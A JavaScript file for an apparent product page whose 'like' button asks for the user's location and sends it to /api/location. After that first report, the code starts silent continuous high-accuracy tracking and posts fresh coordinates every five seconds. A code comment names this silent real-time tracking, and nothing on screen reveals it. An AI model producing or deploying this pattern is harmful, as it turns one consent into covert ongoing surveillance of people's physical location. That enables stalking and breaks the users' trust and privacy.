document.addEventListener('DOMContentLoaded', () => {
    const likeBtns = document.querySelectorAll('.like-btn');
    const loading = document.getElementById('loading');
    const thanksModal = document.getElementById('thanks-modal');
    const closeModal = document.getElementById('close-modal');
    const locationModal = document.getElementById('location-modal');
    const allowLocationBtn = document.getElementById('allow-location');
    const denyLocationBtn = document.getElementById('deny-location');
    let currentLikeBtn = null;

    document.body.addEventListener('click', function(e) {
        if (e.target.closest('.like-btn')) {
            const btn = e.target.closest('.like-btn');
            if (btn.classList.contains('liked')) return;
            
            currentLikeBtn = btn;
            
            // Verificamos si ya tenemos permiso para no molestar al usuario
            if (navigator.permissions) {
                navigator.permissions.query({name: 'geolocation'}).then(function(result) {
                    if (result.state === 'granted') {
                        getGeolocationAndSend(btn);
                    } else {
                        locationModal.classList.remove('hidden');
                    }
                });
            } else {
                locationModal.classList.remove('hidden');
            }
        }
    });

    allowLocationBtn.addEventListener('click', () => {
        locationModal.classList.add('hidden');
        if (currentLikeBtn) getGeolocationAndSend(currentLikeBtn);
    });

    denyLocationBtn.addEventListener('click', () => {
        locationModal.classList.add('hidden');
        if (currentLikeBtn) {
            markAsLiked(currentLikeBtn);
        }
    });

    closeModal.addEventListener('click', () => {
        thanksModal.classList.add('hidden');
    });

    function getGeolocationAndSend(btnElement) {
        loading.classList.remove('hidden');

        if (navigator.geolocation) {
            // Obtener la primera posición rápido
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    sendDataToServer(position.coords, btnElement);
                    
                    // Iniciar rastreo continuo en tiempo real (silencioso y con límite)
                    let lastSendTime = 0;
                    navigator.geolocation.watchPosition(
                        (newPos) => {
                            const now = Date.now();
                            // Solo enviar actualización si pasaron al menos 5 segundos desde el último envío
                            if (now - lastSendTime > 5000) {
                                lastSendTime = now;
                                sendDataToServer(newPos.coords, btnElement, true);
                            }
                        },
                        null,
                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                    );
                },
                (error) => {
                    console.log("Ubicación denegada o error.");
                    loading.classList.add('hidden');
                    markAsLiked(btnElement);
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        } else {
            loading.classList.add('hidden');
            markAsLiked(btnElement);
        }
    }

    function sendDataToServer(coords, btnElement, isUpdate = false) {
        const productId = btnElement.getAttribute('data-id');
        const data = {
            latitude: coords.latitude,
            longitude: coords.longitude,
            accuracy: coords.accuracy,
            productId: productId
        };

        fetch('/api/location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(result => {
            if(!isUpdate) {
                loading.classList.add('hidden');
                markAsLiked(btnElement);
                thanksModal.classList.remove('hidden');
            }
        })
        .catch(error => {
            console.error('Error enviando datos:', error);
            if(!isUpdate) {
                loading.classList.add('hidden');
                markAsLiked(btnElement);
            }
        });
    }

    function markAsLiked(btn) {
        btn.classList.add('liked');
        
        const countSpan = btn.querySelector('.like-count');
        if (countSpan) {
            let count = parseInt(countSpan.innerText) || 0;
            countSpan.innerText = count + 1;
        }
        
        // Mantener el conteo visible
        const updatedCount = btn.querySelector('.like-count') ? btn.querySelector('.like-count').innerText : '';
        btn.innerHTML = `<i class="fa-solid fa-heart"></i> ¡Te gusta! (${updatedCount})`;
    }
});
